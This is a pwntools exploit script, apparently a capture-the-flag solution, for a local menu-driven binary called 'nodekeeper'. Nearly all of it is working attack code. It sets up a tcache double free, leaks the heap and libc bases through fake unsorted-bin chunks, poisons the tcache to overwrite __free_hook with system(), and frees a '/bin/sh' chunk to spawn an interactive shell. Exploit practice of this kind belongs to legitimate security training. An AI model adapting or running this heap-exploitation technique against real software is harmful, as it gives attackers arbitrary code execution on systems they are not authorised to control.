from pwn import *
io = process("./nodekeeper",aslr=False)
libc = ELF("./libc.so.6")

def add(size,data):
    io.sendline("1")
    io.recvuntil("Enter length :")
    io.sendline(str(size))
    io.recvuntil("Enter data :")
    io.sendline(data)
    io.recvuntil("Success")

def remove(nodeIndex,objectIndex):
    io.sendline("2")
    io.recvuntil("Enter index:")
    io.sendline(str(nodeIndex))
    retString = io.recvuntil("Which one?(1337 for all)")
    io.sendline(str(objectIndex))
    io.recvuntil("Success")
    return retString


def link(indexTo,indexFrom):
    io.sendline("3")
    io.recvuntil("Enter to index:")
    io.sendline(str(indexTo))
    io.recvuntil("Enter from index:")
    io.sendline(str(indexFrom))
    io.recvuntil("Success")

def unlink(nodeIndex,objectIndex,keepIt):
    io.sendline("4")
    io.recvuntil("Enter index:")
    io.sendline(str(nodeIndex))
    retString = io.recvuntil("Enter offset:")
    io.sendline((str(objectIndex)))
    io.recvuntil("Do you want to keep it (y/n)?")
    if keepIt:
        io.sendline("y")
    else:
        io.sendline("n")
    io.recvuntil("Success")
    return retString


#setup chunks
add(0x18,"a") #0 setup fakeChunk here
add(0x18,"b") #1
add(0x18,"c") #2
add(0x18,"d") #3 7 0x18 chunks

for i in range(4):
    remove(i,1)

for i in range(7):
    add(0x50,"ABCD"*20)

for i in range(7):
    remove(i,1) #tcache is filled


#start double frees here
add(0x30,"A") #0
add(0x30,"B") #1
add(0x30,"C") #2


link(0,1)
link(0,2)
# a -> b -> c

unlink(0,2,True) #2
# a -> c; b -> c

#fill up tcache
for i in range(7):
    add(0x30,"a")

for i in range(7):
    remove(i+2,1)


remove(0,2)
remove(1,1337) #double free!!11!!1
log.info("Double Free Successful")

#clear out tcache bin
for i in range(3):
    add(0x18,"placeholder") #0 - 3
add(0x30,"placeholder") #4

add(0x18,"") #5
add(0x30,"") #6

#the name of index 5 is also the object of index 6
for i in range(4):
    remove(i,1) #clear out indexes

add(0x30,"a") #0
add(0x30,"b") #1

link(6,1)
link(5,0)

heapLeak = u64(unlink(5,2,False)[19:25].ljust(8,b"\x00"))
heapBase = heapLeak - 0x360
log.info("Heap Base: " + hex(heapBase))

#cleanup
unlink(6,2,False)

#Fake Chunks (unsorted bin)
add(0x18,p64(0)+ p64(0x21)) #0  this chunk is used to bypass prev size check
add(0x18,p64(0x20)+p64(0x551)) #1
fakeChunkPtr = heapBase + 0x390 


remove(5,1)
add(0x18,"")
remove(2,1)
add(0x18,p64(0) + p64(0x18) + p64(fakeChunkPtr)) #2

#Free Fake Chunk
remove(6,1)

#leak libc
add(0x30,"") #3

originalString = heapBase + 0x800
leakLibcChunk = fakeChunkPtr

remove(2,1)
add(0x18,"")
remove(2,1)
add(0x18,p64(0) + p64(0x18) + p64(leakLibcChunk)) #2 now the name of #2 is also the object of #3

add(0x30,"a") #4 temp chunk

link(3,4)
libcLeak = u64(unlink(3,2,False)[19:25].ljust(8,b"\x00"))
libc.address = libcLeak - 2014176
log.info("Libc Base: " + hex(libc.address))

system = libc.symbols["system"]
freeHook = libc.symbols["__free_hook"]
log.info("Free Hook: " + hex(freeHook))
log.info("System: " + hex(system))

remove(2,1)
add(0x18,"")
remove(2,1)
add(0x18,p64(0) + p64(0x18) + p64(originalString)) #libcBase as a decoy cause Idk what else I can free to prevent Error

for i in range(2):
    add(0x18,"abcd")

#fill up tcache

remove(0,1)
remove(1,1)
remove(4,1)
remove(5,1)

#double free
remove(2,1)
remove(3,1)

for i in range(7):
    add(0x30,"placeholder") #0,1,2,3,4,5,7

add(0x30,p64(freeHook)) #8
add(0x30,"")#9

#put these two chunks in tcache and put 2 other chunks in fast bin to make space for exploit
remove(9,1)
remove(8,1)

for i in range(4):
    remove(i,1)

remove(7,1)

#get to exploit chunk
for i in range(3):
    add(0x30,b"/bin/sh" + b"\x00") #0,1,2

binShString = heapBase + 0x8a0

#trick malloc into returning free hook to me
add(0x30,p64(freeHook)) #3 
link(3,0)
add(0x30,"") 
add(0x30,"")
add(0x30,p64(system))

io.sendline("2")
io.sendlineafter("Enter index:","1")
io.sendlineafter("Which one?(1337 for all)","1")

io.interactive()

"""
|-----------------|
|0x18 huge chunk  |
|-----------------|
|0x50 huge chunk  |
|-----------------|
"""
